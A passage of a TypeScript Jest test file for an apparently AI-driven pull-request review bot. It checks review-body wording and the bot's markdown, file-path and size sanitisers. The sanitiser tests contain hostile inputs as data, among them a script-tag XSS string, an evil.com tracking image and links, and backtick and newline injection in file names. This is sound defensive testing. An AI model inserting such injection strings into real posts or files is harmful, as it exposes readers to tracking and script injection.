      outcome: 'NOT_CONVERGING',
      needsHuman: {
        cause: 'repeated',
        blockers: [
          { file: 'src/a.ts', line: 10, title: 'Cache never invalidated', fingerprint: 'k', severity: 'blocker', threadUrl: 'https://github.com/o/r/pull/1#t1' },
          { file: '', title: 'No migration', fingerprint: 'k2' },
        ],
      },
    });
    expect(stuck.event).toBe('REQUEST_CHANGES');
    expect(lead(stuck.body)).toMatch(new RegExp([
      '^\u{1F6D1} \\*\\*Needs a human:\\*\\* 2 blockers came back after a fix\\.',
      '---',
      'Automatic review is paused until someone comments `@manki review`\\.',
      '- `src/a\\.ts:10`: Cache never invalidated \\(\\[view thread\\]\\(https://github\\.com/o/r/pull/1#t1\\)\\)\\n- No migration',
    ].join('\n\n'), 'u'));

    const prior = { file: 'src/a.ts', line: 10, title: 'Still open prior', fingerprint: 'k' };
    const budgetStuck = await postedBody({
      ...base, verdict: 'REQUEST_CHANGES', outcome: 'NOT_CONVERGING', verdictReason: 'prior_unaddressed',
      verdictTrace: { survivingBlockers: [], unresolvedPriors: [prior] },
      needsHuman: { cause: 'budget', blockers: [prior] },
    }, [], undefined, 'A review you start by hand also turns automatic review back on for the next 3 rounds.');
    expect(lead(budgetStuck.body)).toMatch(/^\u{1F6D1} \*\*Needs a human:\*\* 1 blocker still open after the last automatic round\./u);
    expect(budgetStuck.body).toContain('Automatic review is paused until someone comments `@manki review`. A review you start by hand also turns automatic review back on for the next 3 rounds.\n\n- `src/a.ts:10`: Still open prior');
    expect(budgetStuck.body.split('Still open prior')).toHaveLength(2);
    expect(budgetStuck.body).not.toContain('Still open from earlier reviews');
    expect(stuck.body).not.toContain('What this does');
  });

  it('names the findings a PR author dismissed in an approval, with the role that allowed it, and only there', async () => {
    const thread = (title: string, threadId: string, override?: PreviousFinding['securityOverride']): PreviousFinding => ({
      title, file: 'src/a.ts', line: 3, severity: 'blocker', status: 'resolved', threadId, isSecurity: true,
      threadUrl: `https://github.com/o/r/pull/1#${threadId}`, ...(override && { securityOverride: override }),
    });
    const threads = [
      thread('Token leaks into logs', 'r1', { login: 'owner', via: 'resolve', role: 'admin', announced: false }),
      thread('Cleared by a maintainer', 'r2'),
      thread('Secret in the URL', 'r3', { login: 'owner', via: 'dismiss', role: 'maintain', announced: true }),
    ];
    const line = '**Findings dismissed by the PR author:** [Token leaks into logs](https://github.com/o/r/pull/1#r1) by @owner (`admin` role), '
      + '[Secret in the URL](https://github.com/o/r/pull/1#r3) by @owner (`maintain` role).';

    const approved = await postedBody(ready, threads);
    expect(approved.body.split('\n')).toContain(line);
    expect((await postedBody(ready, [thread('Cleared by a maintainer', 'r2')])).body).not.toContain('dismissed by the PR author');
    const blocked = await postedBody({ ...ready, verdict: 'REQUEST_CHANGES', outcome: 'ADDRESS_FIRST', findings: [blocker] }, threads);
    expect(blocked.body).not.toContain('dismissed by the PR author');
  });

  it('explains the top blocker instead of the judge summary when the verdict reader named the blockers', async () => {
    const { body } = await postedBody({
      ...ready,
      verdict: 'REQUEST_CHANGES',
      outcome: 'ADDRESS_FIRST',
      verdictReason: 'verdict_reader',
      verdictReport: { ...verdictReport, verdict: 'ADDRESS_FIRST', blockers: [{ severity: 'blocker', title: 'bug', file: 'src/a.ts', line: 5, description: 'bug', reviewers: ['Verdict reader'] }] },
      summary: 'Nothing to flag.',
      findings: [{ ...blocker, file: '', line: 0, description: 'A synced client cannot start. Storage starts above 0. Handle `None`.' }],
    });
    expect(lead(body)).toMatch(/^\u{1F534} \*\*Changes requested:\*\* 1 blocker\.\n\n\*\*What blocks:\*\* A synced client cannot start\. Storage starts above 0\.\n\n---\n\n\*\*Blockers not tied to a line:\*\*/u);
    expect(body).not.toContain('Nothing to flag');
  });

  it('leaves out the judge\'s summary when the round lists none of the findings the judge kept, or its blockers are not the ones the judge graded', async () => {
    const summary = 'A retry that fails is never reported.';
    const kept: Finding = { ...blocker, severity: 'warning', title: 'Retry drops the error', line: 9, tags: ['follow-up'], cell: { row: 'degraded', column: 'normal' } };
    const droppedBy = (by: GradeChange): Finding => ({ ...kept, title: 'Timeout is never reset', line: 12, severity: 'ignore', gradePath: [{ from: 'warning', to: 'ignore', by }] });
    const round = (more: Partial<ReviewResult>): ReviewResult => ({ ...ready, verdictReport: undefined, summary, findings: [], ...more });
    // The refuter disproved the round's only finding, or a later step took it out of the round.
    expect(roundSentence(round({ allJudgedFindings: [droppedBy('refutation')] }))).toBe('');
    expect(roundSentence(round({ allJudgedFindings: [kept] }))).toBe('');
    // One of the findings the judge kept is still listed. One an earlier thread carries is in `findings` too.
    expect(roundSentence(round({ allJudgedFindings: [kept, droppedBy('refutation')], findings: [kept] }))).toBe(summary);
    expect(roundSentence(round({ allJudgedFindings: [kept], findings: [{ ...kept, threadId: 'PRRT_1' }] }))).toBe(summary);
    // The judge kept nothing itself, so its summary describes no finding a later step could take out.
    expect(roundSentence(round({ allJudgedFindings: [droppedBy('judge')] }))).toBe(summary);
    expect(roundSentence(round({}))).toBe(summary);
    // A finding a finder filed as `ignore` has no grade step when the judge drops it too.
    expect(roundSentence(round({ allJudgedFindings: [{ ...droppedBy('judge'), gradePath: undefined }, { ...droppedBy('judge'), gradePath: [] }] }))).toBe(summary);
    // An incomplete round's summary says why the round did not finish.
    expect(roundSentence(round({ reviewComplete: false, summary: 'The judge failed', allJudgedFindings: [kept] }))).toBe('The judge failed');

    const about = aboutFold('[`abcdef1`](https://github.com/owner/repo/commit/abcdef1234)');
    const disproved = await postedBody(round({ allJudgedFindings: [droppedBy('refutation')] }));
    expect(lead(disproved.body)).toBe(`\u2705 **Approved.**\n\n${about}`);
    const listed = await postedBody(round({ allJudgedFindings: [kept, droppedBy('refutation')], findings: [kept] }));
    expect(lead(listed.body)).toBe(`\u2705 **Approved.** 1 warning, which doesn't block.\n\n**Summary:** ${summary}\n\n${about}`);

    // A blocking round still says what blocks: the top blocker's description, or the earlier threads still open.
    const blocking = round({ verdict: 'REQUEST_CHANGES', outcome: 'ADDRESS_FIRST', verdictReason: 'required_present', allJudgedFindings: [kept] });
    const top = await postedBody({ ...blocking, findings: [blocker] });
    expect(lead(top.body).split('\n\n').slice(0, 2)).toEqual(['\u{1F534} **Changes requested:** 1 blocker.', '**What blocks:** `total / pageSize` rounds down.']);
    // The check and the command line output show the same sentence, at most two sentences of the description.
    expect(roundSummary({ ...blocking, findings: [{ ...blocker, description: 'It rounds down. The last page is lost. Use `ceil`.' }] })).toBe('It rounds down. The last page is lost.');
    const open = { file: 'src/a.ts', title: 'Stale cache', fingerprint: 'src/a.ts:3:3:stale-cache', line: 3 };
    const earlier = await postedBody({ ...blocking, verdictReason: 'prior_unaddressed', verdictTrace: { survivingBlockers: [], unresolvedPriors: [open] } });
    expect(lead(earlier.body)).toBe(`\u{1F534} **Changes requested:** 1 blocker still open from an earlier review.\n\n---\n\n**Still open from earlier reviews:**\n- \`src/a.ts:3\`: Stale cache\n\n${about}`);
    // The review lists the threads in their own section, so only the check and the command line output take the list as what blocks.
    const priors = { ...blocking, verdictReason: 'prior_unaddressed' as const, verdictTrace: { survivingBlockers: [], unresolvedPriors: [open] } };
    expect([roundSentence(priors), roundSummary(priors)]).toEqual(['', '**Still open from earlier reviews:**\n- `src/a.ts:3`: Stale cache']);
    expect(roundSummary(round({ allJudgedFindings: [droppedBy('refutation')] }))).toBe('');

    // The judge wrote that nothing blocks, and a later step made the blocker, so the sentence is the blocker's.
    const blocked = (findings: Finding[], more: Partial<ReviewResult> = {}): ReviewResult =>
      round({ verdict: 'REQUEST_CHANGES', outcome: 'ADDRESS_FIRST', verdictReason: 'required_present', summary: 'Nothing blocks merge.', allJudgedFindings: findings, findings, ...more });
    const byJudge = { ...blocker, gradePath: [{ from: 'warning' as const, to: 'blocker' as const, by: 'judge' as const }] };
    const path = (...steps: [Finding['severity'], Finding['severity'], GradeChange][]): Pick<Finding, 'gradePath'> => ({ gradePath: steps.map(([from, to, by]) => ({ from, to, by })) });
    const confirmed: Finding = { ...blocker, gradeIfConfirmed: 'blocker', ...path(['blocker', 'warning', 'judge'], ['warning', 'blocker', 'refutation']) };
    const lowered = { ...blocker, title: 'Empty list is read', line: 20, description: 'The first item is read unchecked.' };
    const fromBlocker = '`total / pageSize` rounds down.';
    const sentences = (...findings: Finding[]): string[] => findings.map(f => roundSentence(blocked([f])));
    // The judge graded the blocker itself, by raising it or by keeping the grade a finder filed.
    expect(sentences(byJudge, blocker)).toEqual(['Nothing blocks merge.', 'Nothing blocks merge.']);
    // So it did when the refuter gave the blocker back after the unproven cap, and when a security finding moved out of a `rare` column that blocks too.
    const restored = { ...blocker, ...path(['blocker', 'warning', 'unproven'], ['warning', 'blocker', 'refutation']) };
    const severe: Finding = { ...blocker, tags: ['security'], cell: { row: 'severe', column: 'normal', judgeColumn: 'rare' } };
    expect(sentences(restored, severe)).toEqual(['Nothing blocks merge.', 'Nothing blocks merge.']);
    // The refuter confirmed a doubt, on a blocker cell or on the `rare` column. A doubt on a security blocker never held it down, but the judge still named it.
    const reach: Finding = { ...confirmed, cell: { row: 'wrong', column: 'normal', judgeColumn: 'rare' }, ...path(['warning', 'blocker', 'refutation']) };
    expect(sentences(confirmed, reach, { ...severe, gradeIfConfirmed: 'blocker' })).toEqual([fromBlocker, fromBlocker, fromBlocker]);
    // Manki graded a security finding in another column than the judge stated, the judge stated no cell, or the cell is none the table knows.
    const unknownCell = { row: 'critical', column: 'normal' } as unknown as Finding['cell'];
    expect(sentences({ ...byJudge, tags: ['security'], cell: { row: 'wrong', column: 'normal', judgeColumn: 'rare' } }, { ...blocker, cell: undefined }, { ...blocker, cell: unknownCell }))
      .toEqual([fromBlocker, fromBlocker, fromBlocker]);
    // A blocker the round carries on an earlier thread follows the same rule.
    expect(sentences({ ...blocker, threadId: 'PRRT_1' }, { ...confirmed, threadId: 'PRRT_1' })).toEqual(['Nothing blocks merge.', fromBlocker]);
    // A sweep's finding is graded in a later call than the one that wrote the summary.
    const sweeps = [{ reviewer: 'Sweep 1', blocker: 'src/a.ts:20', status: 'answered' as const }];
    expect(roundSentence(blocked([lowered, { ...byJudge, reviewers: ['Sweep 1'] }], { sweeps }))).toBe('The first item is read unchecked.');
    expect(roundSentence(blocked([lowered, byJudge], { sweeps }))).toBe('Nothing blocks merge.');
    // One such blocker is enough, next to one the judge graded.
    expect(roundSentence(blocked([lowered, confirmed]))).toBe('The first item is read unchecked.');
    // A finding the judge graded below blocker changes nothing, and neither does a blocker cell held down by a doubt nobody confirmed.
    const below = (more: Partial<Finding>): Finding => ({ ...blocker, title: 'Offset is off by one', line: 30, description: 'The offset skips a row.', severity: 'warning', tags: ['follow-up'], ...more });
    expect(roundSentence(blocked([lowered, kept, below({ gradeIfConfirmed: 'blocker', ...path(['blocker', 'warning', 'judge']) })]))).toBe('Nothing blocks merge.');
    // A rule warning kept after a disproof of its damage holds no cell, so it is no blocker of the judge's that a later step lowered.
    const keptByRule = below({
      cell: undefined, rule: { file: 'AGENTS.md', quote: 'Every change needs a test.', verdict: 'confirmed' },
      refutation: { outcome: 'disproved', reason: 'The runner copes.', files: ['src/a.ts'], codeDigest: 'abc' }, ...path(['blocker', 'warning', 'judge']),
    });
    expect(roundSentence(blocked([lowered, kept, keptByRule]))).toBe('Nothing blocks merge.');
    // The judge graded a blocker and a later step lowered it for good, so the summary may still call it a blocker:
    // a cap that stayed, a blocker in code the PR left alone, or one two refuters lowered, which keeps the judge's cell as `judgeCell`.
    const loweredLater = [
      ...(['unproven', 'build_claim', 'pre_existing'] as const).map(by => below(path(['blocker', 'warning', by]))),
      below({ cell: undefined, judgeCell: blocker.cell, ...path(['warning', 'blocker', 'judge'], ['blocker', 'warning', 'refutation']) }),
    ];
    expect(loweredLater.map(f => roundSentence(blocked([lowered, f])))).toEqual(loweredLater.map(() => 'The first item is read unchecked.'));
    // With nothing left that blocks, the round has no sentence, whether the finding is still listed as a warning or a disproof dropped it after the cap.
    const approved = (findings: Finding[], all = findings): ReviewResult => round({ summary: 'The offset blocks merge.', allJudgedFindings: all, findings });
    expect(loweredLater.map(f => roundSummary(approved([kept, f])))).toEqual(loweredLater.map(() => ''));
    const cappedThenDisproved = below({ severity: 'ignore', ...path(['blocker', 'warning', 'unproven'], ['warning', 'ignore', 'refutation']) });
    expect([roundSentence(approved([kept], [kept, cappedThenDisproved])), roundSentence(approved([kept]))]).toEqual(['', 'The offset blocks merge.']);
    // A lowered blocker the round records without listing it counts too.
    expect(roundSentence(approved([kept], [kept, loweredLater[0]]))).toBe('');
    const raised = await postedBody(blocked([confirmed]));
    expect(lead(raised.body).split('\n\n').slice(0, 2)).toEqual(['\u{1F534} **Changes requested:** 1 blocker.', `**What blocks:** ${fromBlocker}`]);
    expect([roundSummary(blocked([confirmed])), raised.body.includes('Nothing blocks')]).toEqual([fromBlocker, false]);
  });

  it('counts new blockers apart from those still open from an earlier review', async () => {
    const prior = { file: 'src/a.ts', title: 'Cache never expires', fingerprint: 'f', line: 3 };
    const other = { file: 'src/a.ts', title: 'Lock never released', fingerprint: 'g', line: 9 };
    const blocked: ReviewResult = { ...ready, verdict: 'REQUEST_CHANGES', outcome: 'ADDRESS_FIRST', verdictReport: undefined, summary: '' };
    const priorOnly = { ...blocked, verdictReason: 'prior_unaddressed' as const, findings: [], verdictTrace: { survivingBlockers: [], unresolvedPriors: [prior] } };
    const followUp = makeContext({ meta: { ...makeContext().meta, round: 2 } });

    expect(lead((await postedBody(priorOnly)).body)).toMatch(/^\u{1F534} \*\*Changes requested:\*\* 1 blocker still open from an earlier review\.\n\n---\n\n\*\*Still open from earlier reviews:\*\*\n- `src\/a\.ts:3`: Cache never expires\n/u);
    expect((await postedBody({ ...priorOnly, verdictTrace: { survivingBlockers: [], unresolvedPriors: [prior, other] } })).body)
      .toMatch(/^\u{1F534} \*\*Changes requested:\*\* 2 blockers still open from earlier reviews\./u);

    const newOnly = { ...blocked, verdictReason: 'required_present' as const, findings: [blocker] };
    expect((await postedBody(newOnly)).body).toMatch(/^\u{1F534} \*\*Changes requested:\*\* 1 blocker\./u);
    expect((await postedBody(newOnly, [], followUp)).body).toMatch(/^\u{1F534} \*\*Changes requested:\*\* 1 new blocker\./u);

    const both = (await postedBody({ ...newOnly, verdictTrace: { survivingBlockers: [], unresolvedPriors: [prior, other] } }, [], followUp)).body;
    expect(both).toMatch(/^\u{1F534} \*\*Changes requested:\*\* 1 new blocker and 2 still open\./u);
    expect(both).toContain('**Still open from earlier reviews:**\n- `src/a.ts:3`: Cache never expires\n- `src/a.ts:9`: Lock never released');

    // Two blockers on one open thread are one earlier blocker. A warning on that thread is not a blocker.
    const thread: PreviousFinding = { title: 'Cache never expires', file: 'src/a.ts', line: 3, severity: 'blocker', status: 'open', threadId: 'T1' };
    const onThread = [{ ...blocker, threadId: 'T1' }, { ...blocker, line: 6, threadId: 'T1' }, { ...blocker, severity: 'warning' as const, threadId: 'T1' }];
    expect((await postedBody({ ...newOnly, findings: [blocker, ...onThread] }, [thread], followUp)).body)
      .toMatch(/^\u{1F534} \*\*Changes requested:\*\* 1 new blocker and 1 still open\./u);

    // An earlier blocker named again and one left open share a single list.
    const mixed = (await postedBody({ ...newOnly, findings: [{ ...blocker, threadId: 'T1' }], verdictTrace: { survivingBlockers: [], unresolvedPriors: [other] } }, [thread], followUp)).body;
    expect(mixed).toMatch(/^\u{1F534} \*\*Changes requested:\*\* 2 blockers still open from earlier reviews\./u);
    expect(mixed.split('**Still open from earlier reviews:**')).toHaveLength(2);
    expect(mixed).toContain('**Still open from earlier reviews:**\n- `src/a.ts:9`: Lock never released\n- `src/a.ts:3`: Cache never expires');
  });

  it('opens an INCOMPLETE review with the verdict line and the reason', async () => {
    const { body } = await postedBody({ ...ready, verdict: 'COMMENT', outcome: 'INCOMPLETE', verdictReport: undefined, summary: 'The judge failed', findings: [] });
    expect(lead(body)).toBe(`\u23F8\uFE0F **Review incomplete:** The judge failed.\n\n${aboutFold('[`abcdef1`](https://github.com/owner/repo/commit/abcdef1234)')}`);

    // With its record the round shows the same text, where a complete round's record adds its round and models to the fold.
    const incomplete = { ...ready, verdict: 'COMMENT' as const, outcome: 'INCOMPLETE' as const, verdictReport: undefined, summary: 'The judge failed', findings: [] };
    const record = makeContext({ meta: { ...makeContext().meta, round: 2, outcome: 'INCOMPLETE', incomplete: true } });
    const post = async (context?: RoundContext): Promise<string> => {
      mockCreateReview.mockClear();
      await postReview(mockOctokit, 'owner', 'repo', 1, 'abcdef1234', incomplete, diff, context, context && 1000, { noVerdict: true });
      return (mockCreateReview.mock.calls[0][0] as { body: string }).body;
    };
    const [bare, recorded] = [await post(), await post(record)];
    const hidden = (text: string) => text.replace(/\n*<!--[\s\S]*?-->\n*/g, '');
    expect(hidden(recorded)).toBe(hidden(bare));
    expect(recorded).toContain('<!-- manki-no-verdict -->');
    expect(JSON.parse(extractReviewRecords(recorded).records[0])).toMatchObject({ meta: { round: 2, incomplete: true } });
    // The review still gives no verdict on its commit, so a later run reviews it.
    const posted = { state: 'COMMENTED', commit_id: 'abcdef1234', body: recorded, user: { login: BOT_LOGIN, type: 'Bot' } };
    const reviews = { paginate: jest.fn().mockResolvedValue([posted]), rest: { pulls: { listReviews: {} } } } as unknown as typeof mockOctokit;
    expect(await hasBotReviewOnCommit(reviews, TEST_BOT, 'owner', 'repo', 1, 'abcdef1234')).toBe(false);
    expect(await fetchStandingVerdict(reviews, TEST_BOT, 'owner', 'repo', 1)).toBeUndefined();
  });

  it('lists follow-up warnings off the diff with the other findings, security ones included, most severe first', async () => {
    const followUp = (title: string, line: number, suggestedFix?: string): Finding => ({
      severity: 'warning', title, file: 'src/a.ts', line, description: 'd', reviewers: ['r'], tags: ['follow-up'], ...(suggestedFix && { suggestedFix }),
    });
    const { body } = await postedBody({
      ...ready,
      findings: [
        followUp('Unbounded retry', 40, 'cap at `3`\nattempts'),
        { severity: 'note', title: 'Extract helper', file: 'src/a.ts', line: 47, description: 'Duplicated.', reviewers: [] },
        blocker,
        { severity: 'warning', title: 'Tagged both ways', file: 'src/gone.ts', line: 41, description: 'd', reviewers: ['r'], tags: ['follow-up', 'security'] },
      ],
    });
    const { comments } = mockCreateReview.mock.calls[0][0] as { comments: Array<{ line: number; body: string }> };
    expect(comments.map(c => c.line)).toEqual([5]);
    expect(body).not.toContain('Blockers in files outside this diff');
    // On a first round the findings listed in the body are just "Findings", most severe first.
    expect(body).toContain('---\n\n### Findings · 2 warnings\n\n<details>\n<summary>\u26A0\uFE0F <b>Unbounded retry</b><br><sub><b>Warning, not blocking</b>');
    expect(body.indexOf('<b>Tagged both ways</b>')).toBeLessThan(body.indexOf('<b>Extract helper</b>'));
    expect(body).toContain([
      '<details>',
      '<summary>\u26A0\uFE0F <b>Tagged both ways</b><br><sub><b>Warning, not blocking</b> · <a href="https://github.com/owner/repo/blob/abcdef1234/src/gone.ts#L41"><code>src/gone.ts:41</code></a></sub></summary>',
    ].join('\n'));
    expect(body).toContain([
      '<details>',
      '<summary>\u2728 <b>Extract helper</b><br><sub><b>Note, not blocking</b> · <a href="https://github.com/owner/repo/blob/abcdef1234/src/a.ts#L47"><code>src/a.ts:47</code></a></sub></summary>',
      '',
      '**Why:** Duplicated.',
      '',
      'https://github.com/owner/repo/blob/abcdef1234/src/a.ts#L45-L47',
      '',
      '</details>',
      '',
      '<!-- manki-issue-box -->',
      '- [ ] Create an issue for this <!-- manki-box:issue:src/a.ts:47:cb8097f95d17 -->',
    ].join('\n'));
    expect(body).not.toContain('smaller fix');
  });

  it('writes one emoji at the start of the verdict line, besides the severity of each listed thread, and no dash clause separators in any outcome', async () => {
    const results: ReviewResult[] = [
      ready,
      { ...ready, verdict: 'REQUEST_CHANGES', outcome: 'ADDRESS_FIRST', verdictReport: undefined, summary: 'It breaks.', findings: [blocker, { ...blocker, file: '', line: 0 }, { ...blocker, file: 'src/gone.ts' }] },
      { ...ready, verdict: 'COMMENT', outcome: 'INCOMPLETE', verdictReport: undefined, summary: 'The judge failed.', failedAgents: ['Claude Opus 4.7 · high'] },
      { ...ready, verdict: 'REQUEST_CHANGES', outcome: 'NOT_CONVERGING', needsHuman: { cause: 'repeated', blockers: [{ file: 'src/a.ts', line: 1, title: 'Bug', fingerprint: 'k' }] } },
    ];
    for (const result of results) {
      const { body } = await postedBody(result);
      const verdictLine = lead(body).split('\n')[0];
      expect(verdictLine).toMatch(/^(?:\u2705|\u{1F534}|\u23F8\uFE0F|\u{1F6D1}) \*\*/u);
      // Besides the verdict, only the severity icon of each thread listed under it and of each note's fold shows.
      const threads = /^- (?:\u{1F6AB}|\u26A0\uFE0F|\u2728|\u2728) \[/gmu;
      expect(body.replace(verdictLine, '').replace(threads, '- [').replace(/^<summary>\u2728 <b>/gmu, '<summary><b>')).not.toMatch(EMOJI_RE);
      expect(body).not.toMatch(DASH_SEPARATOR_RE);
      expect(body).not.toMatch(/^> /m);
    }
  });
});

describe('sanitizeMarkdown', () => {
  it('strips HTML comments', () => {
    expect(sanitizeMarkdown('before <!-- hidden --> after')).toBe('before  after');
  });

  it('strips HTML tags', () => {
    expect(sanitizeMarkdown('hello <script>alert(1)</script> world')).toBe('hello alert(1) world');
  });

  it('strips multiline HTML comments', () => {
    expect(sanitizeMarkdown('a <!-- multi\nline\ncomment --> b')).toBe('a  b');
  });

  it('preserves bold and emphasis', () => {
    expect(sanitizeMarkdown('**bold** and *emphasis*')).toBe('**bold** and *emphasis*');
  });

  it('strips markdown images, keeping alt text', () => {
    expect(sanitizeMarkdown('see ![logo](https://evil.com/track.png) here')).toBe('see logo here');
  });

  it('strips markdown links, keeping text', () => {
    expect(sanitizeMarkdown('click [here](https://evil.com) now')).toBe('click here now');
  });

  it('strips images inside links', () => {
    expect(sanitizeMarkdown('[![badge](https://img.url)](https://link.url)')).toBe('badge');
  });

  it('handles empty string', () => {
    expect(sanitizeMarkdown('')).toBe('');
  });

  it('handles string with no HTML', () => {
    const plain = 'Just a regular string with `code` and *emphasis*.';
    expect(sanitizeMarkdown(plain)).toBe(plain);
  });

  it('strips unclosed HTML comments', () => {
    expect(sanitizeMarkdown('before <!-- unclosed comment')).toBe('before ');
  });

  it('strips unclosed HTML tags', () => {
    expect(sanitizeMarkdown('before <div class="x"')).toBe('before ');
  });

  it('neutralizes @mentions with zero-width space', () => {
    expect(sanitizeMarkdown('cc @octocat for review')).toBe('cc @\u200Boctocat for review');
  });

  it('neutralizes @org/team mentions', () => {
    expect(sanitizeMarkdown('cc @myorg/reviewers')).toBe('cc @\u200Bmyorg/reviewers');
  });

  it('neutralizes bare URLs with a zero-width space', () => {
    expect(sanitizeMarkdown('see https://evil.example/login, HTTP://a.example or www.b.example'))
      .toBe('see https:\u200B//evil.example/login, HTTP:\u200B//a.example or www\u200B.b.example');
    expect(sanitizeMarkdown('[docs](https://evil.example) at ftp://c.example')).toBe('docs at ftp:\u200B//c.example');
    expect(sanitizeMarkdown('_https://d.example_ see1https://e.example _www.f.example')).toBe('_https:\u200B//d.example_ see1https:\u200B//e.example _www\u200B.f.example');
  });

  it('does not modify email addresses', () => {
    expect(sanitizeMarkdown('contact user@example.com')).toBe('contact user@example.com');
  });

  it('does not modify already-backticked mentions', () => {
    // The @ inside backticks is preceded by `, which is not [a-zA-Z0-9.], so
    // the regex will insert a ZWS. But since it's inside backticks GitHub won't
    // render it as a mention anyway. The important thing is we don't double-wrap.
    const input = 'see `@octocat` for details';
    const result = sanitizeMarkdown(input);
    expect(result).not.toContain('``');
  });

  it('strips attribute-less HTML tags like <details> and <div>', () => {
    expect(sanitizeMarkdown('<details>content</details>')).toBe('content');
    expect(sanitizeMarkdown('<div>inner</div>')).toBe('inner');
    expect(sanitizeMarkdown('before <b>bold</b> after')).toBe('before bold after');
    expect(sanitizeMarkdown('<summary>title</summary>')).toBe('title');
  });

  it('preserves TypeScript generics that are not HTML tag names', () => {
    expect(sanitizeMarkdown('Array<T>')).toBe('Array<T>');
    expect(sanitizeMarkdown('Map<MyType, string>')).toBe('Map<MyType, string>');
    expect(sanitizeMarkdown('Promise<Result>')).toBe('Promise<Result>');
  });

  it('strips svg and math tags', () => {
    expect(sanitizeMarkdown('before <svg width="100">circle</svg> after')).toBe('before circle after');
    expect(sanitizeMarkdown('inline <math>x+1</math> formula')).toBe('inline x+1 formula');
  });

  it('strips reference-style link definitions', () => {
    expect(sanitizeMarkdown('see [click][1]\n[1]: https://evil.com')).toBe('see click\n');
    expect(sanitizeMarkdown('[logo]: https://evil.com/img.png "alt"')).toBe('');
    expect(sanitizeMarkdown('text\n[ref]: http://example.com\nmore')).toBe('text\n\nmore');
  });

  it('strips self-closing HTML tags like <br/> and <hr />', () => {
    expect(sanitizeMarkdown('line1<br/>line2')).toBe('line1line2');
    expect(sanitizeMarkdown('line1<br />line2')).toBe('line1line2');
    expect(sanitizeMarkdown('above<hr/>below')).toBe('abovebelow');
    expect(sanitizeMarkdown('text<img src="x"/>more')).toBe('textmore');
  });

  it('handles nested bracket edge case in links via second pass', () => {
    expect(sanitizeMarkdown('[![inner](http://img)](http://link)')).toBe('inner');
  });

  it('strips nested HTML comments', () => {
    const result = sanitizeMarkdown('a <!-- <!-- --> --> b');
    expect(result).not.toContain('<!--');
    expect(result).not.toContain('-->');
    expect(result).toMatch(/^a\s+b$/);
    expect(sanitizeMarkdown('x <!-- <!-- a --> --> <!-- <!-- b --> --> y')).not.toContain('-->');
  });
});

describe('sanitizeFilePath', () => {
  it('strips backticks from file paths', () => {
    expect(sanitizeFilePath('src/`evil`.ts')).toBe("src/'evil'.ts");
  });

  it('strips newlines from file paths', () => {
    expect(sanitizeFilePath('src/file\nname.ts')).toBe('src/file name.ts');
  });

  it('strips both backticks and newlines', () => {
    expect(sanitizeFilePath('`path\nwith`\nboth')).toBe("'path with' both");
  });

  it('leaves clean paths unchanged', () => {
    expect(sanitizeFilePath('src/utils.ts')).toBe('src/utils.ts');
  });
});

describe('truncateBody', () => {
  it('returns short text unchanged', () => {
    expect(truncateBody('hello world')).toBe('hello world');
  });

  it('truncates at word boundary near the limit', () => {
    const text = 'word '.repeat(15000); // ~75000 chars
    const result = truncateBody(text);
    expect(result.length).toBeLessThanOrEqual(60000 + 50);
    expect(result).toContain('*(Review body truncated)*');
    expect(result).not.toMatch(/word$/); // should not end mid-word before the truncation notice
  });

  it('respects custom max length', () => {
    const text = 'a '.repeat(100);
    const result = truncateBody(text, 50);
    expect(result.length).toBeLessThanOrEqual(80);
    expect(result).toContain('*(Review body truncated)*');
  });
});

describe('dynamicFence', () => {
  it('returns triple backticks for content without backticks', () => {
    expect(dynamicFence('plain text')).toBe('```');
  });

  it('returns fence longer than content backtick runs', () => {
    expect(dynamicFence('some ```code``` here')).toBe('````');
  });

  it('handles content with single backticks', () => {
    expect(dynamicFence('use `foo` here')).toBe('```');
  });

  it('handles content with long backtick runs', () => {
    expect(dynamicFence('`````')).toBe('``````');
  });
});

describe('sanitizeMarkdown numeric entities', () => {
  it('decodes decimal numeric HTML entities', () => {
    expect(sanitizeMarkdown('&#60;b&#62;bold&#60;/b&#62;')).toBe('bold');
  });

  it('decodes hex numeric HTML entities', () => {
    expect(sanitizeMarkdown('&#x3C;b&#x3E;bold&#x3C;/b&#x3E;')).toBe('bold');
  });

  it('decodes mixed named and numeric entities', () => {
    expect(sanitizeMarkdown('&lt;div&#62;text&#x3C;/div&gt;')).toBe('text');
  });
});

describe('fetchFileContents', () => {
  function mockOctokit(files: Record<string, { content: string; size: number } | 'error'>) {
    return {
      rest: {
        repos: {
          getContent: jest.fn(async ({ path }: { path: string }) => {
            const entry = files[path];
            if (!entry || entry === 'error') {
              throw new Error(`Not found: ${path}`);
            }
            return {
              data: {
                content: Buffer.from(entry.content).toString('base64'),
                encoding: 'base64',
                size: entry.size,
              },
            };
          }),
        },
      },
    } as unknown as Parameters<typeof fetchFileContents>[0];
  }

  it('fetches file contents and returns a map', async () => {
    const octokit = mockOctokit({
      'src/a.ts': { content: 'const a = 1;', size: 12 },
      'src/b.ts': { content: 'const b = 2;', size: 12 },
    });

    const result = await fetchFileContents(octokit, 'owner', 'repo', 'abc123', ['src/a.ts', 'src/b.ts']);
    expect(result.size).toBe(2);
    expect(result.get('src/a.ts')).toBe('const a = 1;');
    expect(result.get('src/b.ts')).toBe('const b = 2;');

    // The default caps inline a 172KB and a 55KB changed file together, and stop above 200KB a file and 400KB in all.
    const sized = (kb: number) => ({ content: 'x'.repeat(kb * 1024), size: kb * 1024 });
    const large = mockOctokit({ 'checker.rs': sized(172), 'collection.rs': sized(55), 'huge.rs': sized(201) });
    expect([...(await fetchFileContents(large, 'owner', 'repo', 'abc123', ['checker.rs', 'collection.rs', 'huge.rs'])).keys()]).toEqual(['checker.rs', 'collection.rs']);
    const many = mockOctokit({ 'a.rs': sized(190), 'b.rs': sized(190), 'c.rs': sized(30) });
    expect([...(await fetchFileContents(many, 'owner', 'repo', 'abc123', ['a.rs', 'b.rs', 'c.rs'])).keys()]).toEqual(['a.rs', 'b.rs']);
  });

  it('skips files exceeding maxFileSize', async () => {
    const octokit = mockOctokit({
      'big.ts': { content: 'x'.repeat(100), size: 60000 },
    });

    const result = await fetchFileContents(octokit, 'owner', 'repo', 'abc123', ['big.ts'], 50000);
    expect(result.size).toBe(0);
  });

  it('skips files that fail to fetch', async () => {
    const octokit = mockOctokit({
      'good.ts': { content: 'ok', size: 2 },
      'missing.ts': 'error',
    });

    const result = await fetchFileContents(octokit, 'owner', 'repo', 'abc123', ['good.ts', 'missing.ts']);
    expect(result.size).toBe(1);
    expect(result.get('good.ts')).toBe('ok');
  });

  it('respects maxTotalSize budget', async () => {
    const octokit = mockOctokit({
      'large.ts': { content: 'a'.repeat(80), size: 80 },
      'small.ts': { content: 'b'.repeat(30), size: 30 },
    });

